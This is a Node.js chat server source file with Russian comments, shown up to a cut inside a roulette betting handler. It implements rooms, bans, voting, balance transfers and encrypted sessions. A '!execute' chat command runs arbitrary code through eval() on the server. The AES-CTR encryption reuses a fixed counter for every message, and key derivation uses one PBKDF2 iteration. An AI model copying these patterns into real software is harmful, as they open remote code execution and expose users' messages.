const express = require(`express`);
const app = require(`express`)(); //express
const http = require(`http`).Server(app); // подключаем модуль http для сервера
const fs = require(`fs`); //Модуль для работы с файловой системой
const bodyParser = require('body-parser'); //парсим url входящих запросов
const aes = require(`aes-js`); //симметричный AES
const RSA = require(`node-rsa`); //ассиметричный RSA
const pbkdf2 = require(`pbkdf2`); //модуль для генерации сеансовых ключей
const crypto = require(`crypto`);
const utils = require(`util`);
let confirmed = require(`./confirmed`);
const zlib = require(`zlib`);
const MongoDB = require(`mongodb`);

zlib.deflate = utils.promisify(zlib.deflate);
zlib.unzip = utils.promisify(zlib.unzip);
crypto.randomBytes = utils.promisify(crypto.randomBytes);

const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);

const Rooms = {},
    Users = {},
    tmpUsers = {};

const date = {
    days: [`воскресенье`, `понедельник`, `вторник`, `среда`, `четверг`, `пятница`, `суббота`],
    months: [`января`, `февраля`, `марта`, `апреля`, `мая`, `июня`, `июля`, `августа`, `сентября`, `октября`, `ноября`, `декабря`],
    options: {
        hour: `numeric`,
        minute: `numeric`,
        second: `numeric`,
    },
    format(date) {
        return `${this.days[date.getDay()]}, ${date.getDate()} ${this.months[date.getMonth()]} ${date.getFullYear()} г., ${date.toLocaleString(`ru`, this.options)}:${date.getMilliseconds()}`;
    }
};

const divideBuf = (buf, part = 262144) => {
    const r = [];
    const count = Math.floor(buf.length / part);
    const end = part * count;
    for (let i = 0; i < end; i += part) {
        r.push(buf.slice(i, i + part));
    }
    if (end < buf.length) {
        r.push(buf.slice(end, buf.length));
    }
    return r;
};

const encoding = `base64`;
let version = fs.readFileSync(`version.txt`, `utf8`);
let clientApp = divideBuf(fs.readFileSync(`app.zlib`));

const {
    MongoClient,
    ObjectID
} = MongoDB;

process
    .on(`unhandledRejection`, (reason, p) => {
        fs.appendFileSync(`serverLog.txt`, JSON.stringify({
            date: date.format(new Date()),
            message: reason.message || reason,
            stack: reason.stack || `no stack in promise error`
        }, null, 4) + `\n\n`);
    })
    .on('uncaughtException', err => {
        const errorStack = {};
        Error.captureStackTrace(errorStack);
        const {
            stack
        } = errorStack;
        fs.appendFileSync(`serverLog.txt`, JSON.stringify({
            date: date.format(new Date()),
            message: err.message || `Сообщение отсутствует. Проброшено примитивное значение ${err || `undefined`}`,
            stack: err.stack || stack
        }, null, 4) + `\n\n`);
        process.exit(1);
    });

let hendrixDatabase = {};

const addDataToCollection = (collection, data) => new Promise((resolve, reject) => {
    collection.insertOne(data, (err, data) => {
        if (err) {
            reject(err);
        } else {
            resolve(data);
        }
    });
});

const findDataInCollection = (collection, filter, projection) => new Promise((resolve, reject) => {
    collection.findOne(filter, projection, (err, data) => {
        if (err) {
            reject(err);
        } else {
            resolve(data);
        }
    });
});

const updateDataInCollection = (collection, filter, data) => new Promise((resolve, reject) => {
    collection.updateOne(filter, data, (err, data) => {
        if (err) {
            reject(err);
        } else {
            resolve(data);
        }
    });
});

const deleteDataInCollection = (collection, filter) => new Promise((resolve, reject) => {
    collection.deleteOne(filter, (err, data) => {
        if (err) {
            reject(err);
        } else {
            resolve(data);
        }
    });
});

MongoClient.connect(`mongodb://localhost:27017`, {
    useNewUrlParser: true
}, function (err, client) {
    hendrixDatabase.accounts = client.db(`hendrix`).collection(`accounts`);
    if (err) {
        console.log(err);
    } else {
        console.log(`successful connection to the database`);
    }
});

const generateSessionKeyAES = async () => {
    const p = await getRandomId();
    const s = await getRandomId();
    return pbkdf2.pbkdf2Sync(p, s, 1, 32, 'sha512').toString(`hex`);
};

const encryptAES = (text, key) => {
    if (typeof key == `string`) {
        key = Buffer.from(key, `hex`);
    }
    if (typeof text == `string`) {
        text = Buffer.from(text);
    }
    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
    const encryptedBytes = aesCtr.encrypt(text);
    return Buffer.from(encryptedBytes).toString(encoding);
};

const decryptAES = (text, key) => {
    if (typeof key == `string`) {
        key = Buffer.from(key, `hex`);
    }
    if (typeof text == `string`) {
        text = Buffer.from(text, encoding);
    }
    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
    const decryptedBytes = aesCtr.decrypt(text);
    return Buffer.from(decryptedBytes).toString();
};

const encryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
    obj[property] = encryptAES(obj[property], key);
}), obj);

const decryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
    obj[property] = decryptAES(obj[property], key);
}), obj);

const disconnect = (room, user, _id) => {
    if (!room) {
        console.log(`${date.format(new Date())} комнаты нет, баг.`);
        console.log(user);
    }
    room.members.splice(room.members.indexOf(_id), 1);
    room.out[_id] = 1;
    delete user.curRoom;
    if (_id == room._creator && room.members.length) {
        room._creator = room.members[Math.random() * room.members.length ^ 0];
    }
    room.stackMessages.push(getSystemMessage({
        message: `[clr=${user.color}]${user.name}[/] вышел из комнаты [clr=${room.color}]${room.name}[/]!`,
        out: _id,
    }));
};

const getDataProperty = async (data, key) => {
    return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), key);
};

const getDecryptedData = async (data, key) => {
    return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
};

const getMessage = (msg, {
    message,
    name,
    color,
    user,
    ...rest
} = {}) => {
    return {
        data: zlib.deflateSync(JSON.stringify(Object.assign({
            message,
            name,
            color,
            user,
            date: new Date(),
        }, msg, rest))).toString(encoding)
    };
}

const getSystemMessage = msg => {
    return getMessage(msg, {
        system: true,
        name: `Hendrix`,
        color: `#00B0F6`,
        confirmed: true,
        badges: [{
            description: `Hendrix Official`,
            badge: 8
        }]
    });
};

const auth = (room, roomId, user, userId, password, disconnectFlag = false) => (!room.passwordProtected || room.passwordProtected && password == room.password) && (!room.banned[user._ip] || disconnectFlag);

app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameterLimit: 50000
}));

const createFileWatcher = (filename, callback) => {
    let updateFileTimer = false;
    fs.watch(filename, (event, filename) => {
        if (filename) {
            if (updateFileTimer) {
                return;
            };
            updateFileTimer = setTimeout(() => {
                updateFileTimer = false;
            }, 100);
           callback(event, filename);
        }
    });
};

createFileWatcher(`version.txt`, async (event, filename) => {
    await new Promise(res => setTimeout(res, 200));
    version = fs.readFileSync(filename, `utf8`);
});

createFileWatcher(`app.zlib`, async (event, filename) => {
    await new Promise(res => setTimeout(res, 200));
    clientApp = divideBuf(fs.readFileSync(`app.zlib`));
});

//get all set clients - expressWs.getWss().clients

var expressWs = require('express-ws')(app);

app.ws('/updateClient', function (ws, req) {
    ws.send(JSON.stringify({
        version,
        partsCount: clientApp.length
    }));
    for (let i = 0; i < clientApp.length; i++) {
        ws.send(clientApp[i]);
    }
    ws.close();
});

const server = app.listen(8080, function () {
    console.log('HTTP server started on port 8080');
});

server.setTimeout(1e9);

app.post(`/getAESKey`, async (req, res) => {
    const key = new RSA().importKey(req.body.key);
    const aeskeyhex = await generateSessionKeyAES();
    const aeskeyencrypted = key.encrypt(aeskeyhex, 'hex');
    let pos;
    if (!tmpUsers[req.ip]) {
        tmpUsers[req.ip] = [aeskeyhex];
    } else {
        tmpUsers[req.ip].push(aeskeyhex);
    }
    pos = tmpUsers[req.ip].length - 1;
    res.send({
        aeskeyencrypted,
        pos
    });
});

app.post(`/updateAESKey`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const key = new RSA().importKey(data.key);
    if (data.secretString == user.secretString) {
        const aesKey = await generateSessionKeyAES();
        const aesKeyBytes = aes.utils.hex.toBytes(aesKey);
        const aeskeyencrypted = key.encrypt(aesKey, 'hex');
        user.aesKey = aesKey;
        user.aesKeyBytes = aesKeyBytes;
        res.send({
            aeskeyencrypted
        });
    } else {
        res.send({
            message: `suck, hacker!`
        })
    }
});

app.post(`/savePerson`, async (req, res) => {
    const userId = req.body._id;
    const pos = req.body.pos;
    const _ip = req.ip;
    const success = !!(tmpUsers[_ip] && tmpUsers[_ip][pos]);
    if (tmpUsers[_ip] && tmpUsers[_ip][pos]) {
        const aesKey = tmpUsers[_ip][pos];
        const aesKeyBytes = aes.utils.hex.toBytes(aesKey);
        const user = await getDecryptedData(req.body.data, aesKeyBytes);
        const {
            name,
            color,
            secretString,
            _token,
        } = user;
        Users[userId] = {
            name,
            color,
            secretString,
            aesKey,
            aesKeyBytes,
            _token,
            _ip
        };
        delete tmpUsers[req.ip][pos];
        if (!tmpUsers[req.ip].length) {
            delete tmpUsers[req.ip];
        }
    }
    res.send({
        success
    });
});

app.post(`/createRoom`, async (req, res) => {
    const userId = req.body._id;
    const room = await getDecryptedData(req.body.data, Users[userId].aesKeyBytes);
    const hidden = room.hidden;
    const roomId = room._id;
    delete room._id;
    Rooms[roomId] = Object.assign({
        passwordProtected: !!room.password.length,
        members: [userId],
        _creator: userId,
        stackMessages: [
            getSystemMessage({
                message: `Вы успешно создали комнату [clr=${room.color}]${room.name}[/]!${hidden ? `\nId для подключения:\n[clr=${room.color}]${roomId}[/]` : ``}`,
            })
        ],
        stackFileMessages: [],
        stackMembers: {},
        stackFileMembers: {},
        stackResMessage: [],
        out: {},
        banned: {},
        roulette: {
            users: {},
            bets: {}
        }
    }, room);
    res.send({
        success: true
    });
});

app.post(`/checkHiddenRoom`, (req, res) => {
    const key = Users[req.body._id].aesKeyBytes;
    const room = Rooms[decryptAES(req.body.data, key)];
    const data = {
        logIn: room && room.hidden
    };
    if (room && room.hidden) {
        data.color = room.color;
        data.name = room.name;
    }
    res.send({
        data: encryptAES(JSON.stringify(data), key)
    });
});

app.post(`/getPublicRooms`, (req, res) => {
    let rooms = {};
    for (let roomId in Rooms) {
        let {
            passwordProtected,
            members,
            name,
            color,
            hidden
        } = Rooms[roomId];
        if (hidden) {
            continue;
        }
        members = members.length;
        rooms[roomId] = {
            passwordProtected,
            members,
            name,
            color
        };
    }
    if (Users[req.body._id]) {
        res.send({
            data: encryptAES(JSON.stringify(rooms), Users[req.body._id].aesKeyBytes)
        });
    } else {
        res.send({
            message: `suck!`
        });
    }
});

app.post(`/logIn`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const key = user.aesKeyBytes;
    const roomData = await getDecryptedData(req.body.data, key);
    const userPassword = roomData.password;
    const roomId = roomData._id;
    const room = Rooms[roomId];
    if (!room) {
        return res.send({
            logIn: false
        });
    }
    if (room.banned[user._ip]) {
        return res.send({
            logIn: false,
            banned: true
        });
    }
    let logIn = true;
    if (room.passwordProtected && userPassword != room.password) {
        logIn = false;
    }
    if (logIn && !room.stackMembers[userId]) {
        room.stackMembers[userId] = [];
        room.stackFileMembers[userId] = [];
    }
    if (logIn) {
        if (!room.members.length) {
            room._creator = userId;
        }
        if (!room.members.includes(userId)) {
            room.members.push(userId);
        }
        if (!room.roulette.users[userId]) {
            room.roulette.users[userId] = {
                totalBets: 0,
                wins: 0,
                losses: 0,
                winrate: 0,
                totalWon: 0,
                totalLost: 0
            };
        }
        user.curRoom = roomId;
        delete room.out[userId];
        if (roomData.check != `true`) {
            room.stackMessages.push(getSystemMessage({
                message: `[clr=${user.color}]${user.name}[/] подключился к комнате [clr=${room.color}]${room.name}[/]!`
            }));
        }
    } else if (!room.disableNotif) {
        room.stackMessages.push(getSystemMessage({
            message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
        }));
    }
    res.send({
        logIn
    });
});

const notifications = {

};

app.post(`/subNotifications`, (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = JSON.parse(decryptAES(req.body.data, user.aesKeyBytes));
    if (data.canceled) {
        const room = Rooms[data.canceled._id];
        room.stackMessages.push(getSystemMessage({
            message: `[clr=${user.color}]${user.name}[/] отменил приглашение!`
        }));
    }
    if (data.secretString == user.secretString) {
        notifications[userId] = res;
    } else {
        res.send({
            success: false
        })
    }
});

app.post(`/subscribe`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const key = user.aesKeyBytes;
    const roomData = await getDecryptedData(req.body.data, key);
    const room = Rooms[roomData._id];
    if (auth(room, roomData._id, user, userId, roomData.password)) {
        res._id = userId;
        room.stackResMessage.push(res);
        res.on(`close`, () => {
            const position = room.stackResMessage.indexOf(res);
            if (~position) {
                room.stackResMessage.splice(position, 1);
            }
        });
    } else {
        res.send({
            success: false
        });
    }
});

let oneTooneMessages = [],
    oneTooneStack = {};

app.post(`/oneToOneSub`, (req, res) => {
    const {
        _id
    } = req.body;
    oneTooneStack[_id] = res;
});

app.post(`/oneToOnePublish`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const message = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const recipientId = message._id;
    const recipient = Users[recipientId]
    const success = !!recipient && recipientId != userId;
    const resObj = {
        success
    };
    if (success) {
        resObj.recipientInfo = {
            _id: message._id,
            name: recipient.name,
            color: recipient.color
        };
        message.from = {
            _id: userId,
            name: user.name,
            color: user.color
        };
        oneTooneMessages.push(message);
    }
    res.send({
        data: await getDataProperty(resObj, user.aesKeyBytes)
    });
});

setInterval(async () => {
    for (let roomId in Rooms) {
        const room = Rooms[roomId];
        if (!room.members.length && !room._timer) {
            room._timer = setTimeout(() => {
                if (!room.members.length) {
                    delete Rooms[roomId];
                }
                delete room._timer;
            }, 30000); //удаление пустой комнаты через 30 секунд
        }
        if (!room.stackResMessage.length) {
            continue;
        }
        let message = room.stackMessages.shift();
        if (message) {
            for (let userId in room.stackMembers) {
                if (room.out[userId]) {
                    delete room.stackMembers[userId];
                    delete room.stackFileMembers[userId];
                } else {
                    room.stackMembers[userId].push(message);
                }
            }
        } else {
            message = room.stackFileMessages.shift();
            if (message) {
                for (let userId in room.stackFileMembers) {
                    room.stackFileMembers[userId].push(message);
                }
            }
        }
        const filter = {};
        for (let i = 0; i < room.stackResMessage.length; i++) {
            const response = room.stackResMessage[i];
            const userId = response._id;
            if (!room.stackMembers[userId]) {
                continue;
            }
            let message = room.stackMembers[userId].shift();
            if (!message) {
                message = room.stackFileMembers[userId].shift();
            }
            if (!message) {
                filter[i] = true;
                continue;
            }
            if (!room.out[userId]) {
                const data = encryptAES(message.data, Users[userId].aesKeyBytes);
                response.send({
                    data
                });
            }
        }
        room.stackResMessage = room.stackResMessage.filter((response, position) => filter[position]);
    }
    for (let i = 0; i < oneTooneMessages.length; i++) {
        const message = oneTooneMessages[i];
        const recipientId = message._id;
        if (oneTooneStack[recipientId]) {
            delete message._id;
            oneTooneStack[recipientId].send({
                data: await getDataProperty(message, Users[recipientId].aesKeyBytes)
            });
            delete oneTooneStack[recipientId];
            oneTooneMessages.splice(i, 1);
            i--;
        }
    }
}, 0);

//Привилегировання команда, доступная только узкому кругу лиц (разработчикам)
//специально запускается в текущем контексте с доступом из замыкания ко всем переменным сервера.

const executeJS = code => {
    try {
        let r = JSON.stringify(eval(code)) || ``;
        return r;
    } catch (e) {
        return e.message;
    }
};

const getHandlerWithCondition = (condition, handlerIfTrue, handlerIfFalse) => (...args) => {
    if (condition(...args)) {
        handlerIfTrue(...args);
    } else {
        handlerIfFalse(...args);
    }
};

const getRoomCreatorHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => room._creator == userId, handler, (match, user, userId, room, roomId) => {
    room.stackMessages.push(getSystemMessage({
        message: `Доступно только администратору комнаты!`
    }));
});

const getAdminHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => confirmed[user._token] && confirmed[user._token].root, handler, (match, user, userId, room, roomId) => {
    room.stackMessages.push(getSystemMessage({
        message: `Доступ запрещён.`
    }));
});

const getHiddenRoomHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => !room.hidden, handler, (match, user, userId, room, roomId) => {
    room.stackMessages.push(getSystemMessage({
        message: `В скрытых комнатах данная команда запрещена.`
    }));
});

const commands = [{
        reg: /[!/]кто\s+([\s\S]+)/gi,
        handler: getHiddenRoomHandler((match, user, userId, room, roomId) => {
            const roomUsers = room.members;
            const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
            room.stackMessages.push(getSystemMessage({
                message: `[clr=${randomUser.color}]${randomUser.name}[/] ${match[1]}`
            }));
        })
    },
    {
        reg: /[!/]id/gi,
        handler(match, user, userId, room, roomId) {
            room.stackMessages.push(getSystemMessage({
                message: room._creator == userId ? `Id комнаты [clr=${room.color}]${room.name}[/]: [clr=${room.color} bold]${roomId}[/]` : `Доступно только создателям комнаты!`
            }));
        }
    },
    {
        reg: /[!/]сказать\s+([\s\S]+)/gi,
        handler: getHiddenRoomHandler(getRoomCreatorHandler((match, user, userId, room, roomId) => {
            const roomUsers = room.members;
            const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
            const message = match[1];
            let msg = {
                message,
                name: randomUser.name,
                color: randomUser.color,
                user: userId,
            };
            const conf = confirmed[randomUser._token];
            if (conf) {
                msg.confirmed = true;
                msg = Object.assign(msg, conf);
            }
            room.stackMessages.push(getMessage(msg));
        }))
    },
    {
        reg: /[!/]выбрать\s*((?:(?:\S+ ?)+?(?:\s+или\s+)?)+)/ig,
        handler(match, user, userId, room, roomId) {
            const variants = match[1].split(/\s+или\s+/i);
            room.stackMessages.push(getSystemMessage({
                message: variants[Math.random() * variants.length ^ 0]
            }));
        }
    },
    {
        reg: /[!/](?:(?:yn)|(?:данет)|(?:правда))/ig,
        yes: [`+`, `Да`, `ДА!`, `Да)`, `true`, `Истина в последней инстанции`, `Правда`, `Это риторический вопрос`, `Очевидно, да`, `Конечно!`, `А ты как будто бы не знаешь?`, `Есть такое дело`, `Так точно`, `Вот именно`],
        no: [`-`, `Нет`, `НЕТ!`, `Нет)`, `false`, `Ложь`, `Очевидно, нет`, `Конечно, нет!`, `Не-а`, `Ложь и пропаганда`, `Неправда`, `Тебя обманули`],
        handler(match, user, userId, room, roomId) {
            room.stackMessages.push(getSystemMessage({
                message: Math.round(Math.random()) ? this.yes[Math.random() * this.yes.length ^ 0] : this.no[Math.random() * this.no.length ^ 0]
            }));
        }
    },
    {
        reg: /[!/]шанс\s+([\s\S]+)/ig,
        handler(match, user, userId, room, roomId) {
            room.stackMessages.push(getSystemMessage({
                message: `шанс ${match[1]}: ${(Math.random() * 100).toFixed(4)}%`,
            }));
        }
    },
    {
        reg: /[!/]когда/ig,
        handler(match, user, userId, room, roomId) {
            room.stackMessages.push(getSystemMessage({
                message: date.format(new Date((Math.random() * 5e12) + +new Date(new Date() - 946674000000))),
            }));
        }
    },
    {
        reg: /[!/]execute\s+([\s\S]+)/gi,
        handler(match, user, userId, room, roomId) {
            room.stackMessages.push(getSystemMessage({
                message: confirmed[user._token] && confirmed[user._token].root ? executeJS(match[1]) : `Доступ запрещён.`
            }));
        }
    },
    {
        reg: /[!/]ban\s+([a-f\d]+)/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            const usrId = match[1];
            if (usrId == userId) {
                return room.stackMessages.push(getSystemMessage({
                    message: `Себя нельзя забанить!`
                }));
            }
            if (Users[usrId]) {
                const bannedUser = Users[usrId];
                room.banned[bannedUser._ip] = 1;
                room.stackMessages.push(getSystemMessage({
                    message: `[clr=${bannedUser.color}]${bannedUser.name}[/] забанен!`
                }));
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Пользователь не существует!`
                }));
            }
        })
    },
    {
        reg: /[!/]unban\s+([a-f\d]+)/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            const usrId = match[1];
            if (usrId == userId) {
                return room.stackMessages.push(getSystemMessage({
                    message: `Вы создатель комнаты, разбанить себя невозможно!`
                }));
            }
            const unBannedUser = Users[usrId];
            if (unBannedUser) {
                if (room.banned[unBannedUser._ip]) {
                    delete room.banned[unBannedUser._ip];
                    room.stackMessages.push(getSystemMessage({
                        message: `[clr=${unBannedUser.color}]${unBannedUser.name}[/] разбанен!`
                    }));
                } else {
                    room.stackMessages.push(getSystemMessage({
                        message: `Пользователь не забанен!`
                    }));
                }
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Пользователь не существует!`
                }));
            }
        })
    },
    {
        reg: /[!/]пригласить\s+([a-f\d]+)/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            const usrId = match[1];
            if (usrId == userId) {
                return room.stackMessages.push(getSystemMessage({
                    message: `Невозможно пригласить себя!`
                }));
            }
            const invitedUser = Users[usrId];
            if (invitedUser) {
                if (room.stackMembers[usrId]) {
                    room.stackMessages.push(getSystemMessage({
                        message: `Пользователь уже в комнате!`
                    }));
                } else {
                    if (notifications[usrId]) {
                        notifications[usrId].send({
                            data: encryptAES(JSON.stringify({
                                message: `Вы приглашены в комнату <span style="color: ${room.color}">${room.name}</span> пользователем <span style="color: ${user.color}">${user.name}</span>`,
                                _id: roomId,
                                password: room.password,
                                color: room.color,
                                name: room.name
                            }), invitedUser.aesKeyBytes)
                        });
                        delete notifications[usrId];
                        room.stackMessages.push(getSystemMessage({
                            message: `Приглашение выслано пользователю [clr=${invitedUser.color}]${invitedUser.name}[/]!`
                        }));
                    } else {
                        room.stackMessages.push(getSystemMessage({
                            message: `Пользователь занят!`
                        }));
                    }
                }
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Пользователь не существует!`
                }));
            }
        })
    },
    {
        reg: /[!/]голосование\s+(\d+)\s*(г|с)\s+([^\n]+)\s+([\s\S]+)/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            if (room.voting) {
                room.stackMessages.push(getSystemMessage({
                    message: `Голосование уже запущено!`
                }));
            } else {
                let [count, choice, text, options] = match.slice(1, match.length);
                count = +count;
                const voting = {
                    text,
                    choice,
                    totalVoted: 0,
                    alreadyVoted: {},
                    options: {}
                };
                let filtered = options.split(`\n`).filter(e => e && e.split(/\s*-\s*/).length > 1);
                if (!filtered.length) {
                    return room.stackMessages.push(getSystemMessage({
                        message: `Нужен хотя бы 1 вариант для проведения голосования!`
                    }));
                }
                if (choice == `г`) {
                    if (count > room.members.length) {
                        count = room.members.length;
                    } else if (!+count) {
                        return room.stackMessages.push(getSystemMessage({
                            message: `Нужен хотя бы 1 голос!`
                        }));
                    }
                } else {
                    if (count > 3600) {
                        count = 3600;
                    } else if (!+count) {
                        return room.stackMessages.push(getSystemMessage({
                            message: `Недопустимое время голосования!`
                        }));
                    }
                    room.votingTimer = setTimeout(() => {
                        completeVote(room);
                    }, count * 1000);
                }
                voting.count = count;
                let message = `Голосование ${text} создано!\nРезультаты будут подведены, когда ${choice == `г` ? `наберётся ${count} голосов`: `пройдёт ${count} секунд`}.\nЧтобы проголосовать, напишите команду !голос <номер варианта>:`
                filtered.forEach(variant => {
                    let [number, text, ...rest] = variant.split(/\s*-\s*/);
                    text = `${text}${rest.join(``)}`;
                    voting.options[number] = {
                        text,
                        voted: 0
                    };
                    message += `\n${number} - ${text}`;
                });
                room.stackMessages.push(getSystemMessage({
                    message
                }));
                room.voting = voting;
            }
        })
    },
    {
        reg: /[!/]голос\s+(\d+)/gi,
        handler(match, user, userId, room, roomId) {
            const number = match[1];
            if (room.voting) {
                if (room.voting.alreadyVoted[userId]) {
                    room.stackMessages.push(getSystemMessage({
                        message: `[clr=${user.color}]${user.name}[/], Вы уже проголосовали!`
                    }));
                } else {
                    if (room.voting.options[number]) {
                        room.voting.options[number].voted++;
                        room.voting.totalVoted++;
                        room.voting.alreadyVoted[userId] = true;
                        room.stackMessages.push(getSystemMessage({
                            message: `[clr=${user.color}]${user.name}[/] проголосовал!`
                        }));
                        if (room.voting.choice == `г` && room.voting.totalVoted >= room.voting.count) {
                            completeVote(room);
                        }
                    } else {
                        room.stackMessages.push(getSystemMessage({
                            message: `Нет такого варианта!`
                        }));
                    }
                }
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Сейчас нет активного голосования!`
                }));
            }
        }
    },
    {
        reg: /[!/]завершить/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            if (room.voting) {
                completeVote(room);
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Сейчас нет активного голосования!`
                }));
            }
        })
    },
    {
        reg: /[!/]баланс/gi,
        async handler(match, user, userId, room, roomId) {
            if (user._account) {
                room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], Ваш баланс [clr=${user.color} bold]${await getUserAccBalance(user._account.objId)}[/]!`
                }));
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
                }));
            }
        }
    },
    {
        reg: /[!/]перевести\s+(\d+)\s+([a-f\d]+)\s*([a-zа-я0-9ё\d\s]{0,60})?/gi,
        async handler(match, user, userId, room, roomId) {
            const count = +match[1];
            const [, ,
                recipient,
                comment = ``
            ] = match;
            const whom = Users[recipient];
            if (!user._account) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
                }));
            }
            if (!count) {
                return room.stackMessages.push(getSystemMessage({
                    message: `Слишком маленькая сумма для транзакции!`
                }));
            }
            const yourBalance = await getUserAccBalance(user._account.objId);
            if (yourBalance < count) {
                return room.stackMessages.push(getSystemMessage({
                    message: `Недостаточно средств!`
                }));
            }
            const operationSenderObj = {
                value: -count,
                comment,
                outgoing: true
            };
            const operationRecipientObj = {
                value: count,
                comment,
                outgoing: false
            };
            if (whom) {
                if (!whom._account) {
                    return room.stackMessages.push(getSystemMessage({
                        message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
                    }));
                }
                if (recipient == userId || user._account.id == whom._account.id) {
                    return room.stackMessages.push(getSystemMessage({
                        message: `Перевод на тот же счет недопустим!`
                    }));
                }
                operationRecipientObj._id = operationSenderObj._id = whom._account.id;
                await changeUserBalance(user._account.objId, -count, operationSenderObj);
                await changeUserBalance(whom._account.objId, count, operationRecipientObj);
                room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] пользователю [clr=${whom.color}]${whom.name}[/]`
                }));
            } else {
                if (await accountExists(recipient)) {
                    operationRecipientObj._id = operationSenderObj._id = recipient;
                    await changeUserBalance(user._account.objId, -count, operationSenderObj);
                    await changeUserBalance(ObjectID(recipient), count, operationRecipientObj);
                    room.stackMessages.push(getSystemMessage({
                        message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] на счет [bold]${recipient}[/]`
                    }));
                } else {
                    room.stackMessages.push(getSystemMessage({
                        message: `Пользователя с таким id и счета не существует!`
                    }));
                }
            }
        }
    },
    {
        reg: /[!/]ставка\s+(\d+(?:\.\d+)?)\s+([\d-\sа-яё!]+)/gi,
        async handler(match, user, userId, room, roomId) {
            let count = +match[1];
            if (!user._account) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
                }));
            };
            const userBalance = await getUserAccBalance(user._account.objId);
            if (userBalance < count) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], недостаточно средств для ставки!`
                }));
            }
            if (count <= 1 && match[1].match(/\./)) {
                count = Math.round(count * room.roulette.users[userId].balance);
            }
            if (!count) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], поставьте хоть что-то!`
                }));
            }
            if (room.roulette.bets[userId]) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], Вы уже сделали ставку!`
                }));
            }
            const curDate = new Date();
            if (curDate > roulette.maximumBetTime) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], Вы не можете сделать ставку сейчас! Дождитесь следующей через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate) / 1000)} секунд`
                }));
            }
            let conditions = match[2].split(/\s+/).filter(e => e);
            for (let i = 0; i < conditions.length; i++) {
                if (i && conditions[i] == `-`) {
                    conditions[i - 1] = `${conditions[i - 1]}${conditions[i]}${conditions[i + 1]}`;
                    conditions.splice(i, 2);
                    i--;
                } else if (i && conditions[i][0] == `-` && !conditions[i - 1].match(/-/)) {
                    conditions[i - 1] = `${conditions[i - 1]}${conditions[i]}`;
                    conditions.splice(i, 1);
                    i--;
                } else if (i < conditions.length - 1 && conditions[i][conditions[i].length - 1] == `-` && !conditions[i + 1].match(/-/)) {
                    conditions[i] = `${conditions[i]}${conditions[i + 1]}`;
                    conditions.splice(i + 1, 1);
                    i--;
                }
            }
            conditions = conditions.filter(e => typeof + e == `number` && !isNaN(+e) ? +e > 0 : true);
            let numbers = [];
            conditions.forEach(condition => {
                const m = condition.match(/(не)?ч(?:е|ё)т/i);
                if (m) {
                    const position = +!m[1];
                    numbers = [...numbers, ...[roulette.odd, roulette.even][position]];
                } else {
                    const nums = condition.split(/\s*-\s*/).map(e => +e);
                    if (nums.length == 1) {
                        const num = nums[0];
                        if (num <= roulette.upperLimit) {
                            numbers.push(num);
                        }
                    } else if (nums.length == 2 && nums[0] < nums[1] && nums[0] <= roulette.upperLimit && nums[1] <= roulette.upperLimit) {
                        numbers.push(...Array.from({
                            length: nums[1] - (nums[0] - 1)
                        }, (e, p) => p + nums[0]));
                    }
                }
            });
            numbers = [...new Set(numbers)].sort((a, b) => a - b);
            if (!numbers.length) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], неверные условия ставки!`
                }));
            }
            const chance = numbers.length / roulette.upperLimit;
            if (room.roulette.chance && chance > room.roulette.chance) {
                return room.stackMessages.push(getSystemMessage({
                    message: `[clr=${user.color}]${user.name}[/], шансы на победу > ${(room.roulette.chance * 100).toFixed(3)}% недоступны! (У вас ${(chance * 100).toFixed(3)}%)`
                }));
            }
